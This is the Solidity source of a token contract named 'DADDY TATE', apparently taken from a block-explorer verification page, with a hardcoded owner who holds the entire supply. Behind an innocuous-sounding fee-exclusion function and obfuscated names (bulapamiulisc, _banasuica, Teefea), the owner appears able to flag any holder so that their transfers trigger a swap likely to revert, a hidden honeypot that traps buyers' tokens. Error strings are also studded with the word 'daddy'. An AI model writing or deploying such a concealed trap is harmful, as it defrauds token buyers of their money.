/**
 *Submitted for verification at Arbiscan.io on 2024-06-17
*/

/**
 *Submitted for verification at basescan.org on 2024-06-13
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
      
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition daddy overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction daddy overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath:daddy multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: daddymodulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {codehash := extcodehash(account)}
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: daddyinsufficient balance");

       
        (bool success,) = recipient.call{ value : amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: daddylow-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "daddyAddress: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call todaddy non-contract");

        (bool success, bytes memory returndata) = target.call{ value : weiValue}(data);
        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller daddyis not the owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);

}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);


}

interface IUniswapV2Router02 is IUniswapV2Router01 {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract Token is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address payable public mktwallet;
    address payable public teamwallet;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public isfromfee;
    mapping (address => bool) public bulapamiulisc;


    uint256 public _totalbuy = 0;
    uint256 public _totalsell = 0;
    uint256 private _totalSupply;
    uint256 private _minitoknbsfer = 0;


    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );

    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }


    constructor (
    ) payable {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x248AB79Bbb9bC29bB72f7Cd42F17e054Fc40188e);
        _name = "DADDY TATE";
        _symbol = "DADDY";
        _decimals = 9;
        _owner = 0xbBBDAbd482D704f37B7F26057aA919Ce9A825472;
        _totalSupply = 1000000000  * 10 ** _decimals;
        mktwallet = payable(0xbBBDAbd482D704f37B7F26057aA919Ce9A825472);
        teamwallet = payable(0xbBBDAbd482D704f37B7F26057aA919Ce9A825472);
        uniswapV2Router = _uniswapV2Router;
        isfromfee[_owner] = true;
        isfromfee[address(this)] = true;
        isfromfee[mktwallet] = true;
        isfromfee[teamwallet] = true;
        bulapamiulisc[address(uniswapPair)] = true;

        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreaseddaddy allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return _minitoknbsfer;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from daddythe zero address");
        require(spender != address(0), "ERC20: daddyapprove to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function excludeAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            isfromfee[accounts[i]] = excluded;bulapamiulisc[accounts[i]]=isfromfee[accounts[i]];
        }
    }

    function setnum(uint256 newLimit) external onlyOwner() {
        _minitoknbsfer = newLimit;
    }

    function setswap(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }


    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    
     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer daddyamount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: daddytransfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if(inSwapAndLiquify)
        {
            return _banasuica(sender, recipient, amount);
        }
        else
        {

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= _minitoknbsfer;

            if (overMinimumTokenBalance && !inSwapAndLiquify && bulapamiulisc[sender] && swapAndLiquifyEnabled)
            {
                if(swapAndLiquifyByLimitOnly)
                    contractTokenBalance = _minitoknbsfer;
                swapAndLiquify(contractTokenBalance);
            }

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount = (isfromfee[sender] || isfromfee[recipient]) ?
                                         amount : Teefea(sender, recipient, amount);


            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }

    function _banasuica(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient daddyBalance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }


    function swapAndLiquify(uint256 tAmount) private lockTheSwap {

        // swap token -> eth
        swapTokensForEth(tAmount);
        uint256 amountReceived = address(this).balance;
         
        // team eth
        uint256 amountUSDTTeam = amountReceived.mul(50).div(100);
        // marketing eth
        uint256 amountUSDTMarketing = amountReceived.sub(amountUSDTTeam);

        if(amountUSDTMarketing > 0)
            transferToAddressETH(mktwallet, amountUSDTMarketing);

        if(amountUSDTTeam > 0)
            transferToAddressETH(teamwallet, amountUSDTTeam);


    }
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();


        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );

        emit SwapTokensForETH(tokenAmount, path);
    }



    function Teefea(address sender, address recipient, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = 0;
        if(bulapamiulisc[sender]) {
            feeAmount = amount.mul(_totalbuy).div(100);
        }
        else if(bulapamiulisc[recipient]) {
            feeAmount = amount.mul(_totalsell).div(100);
        }
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }

   
}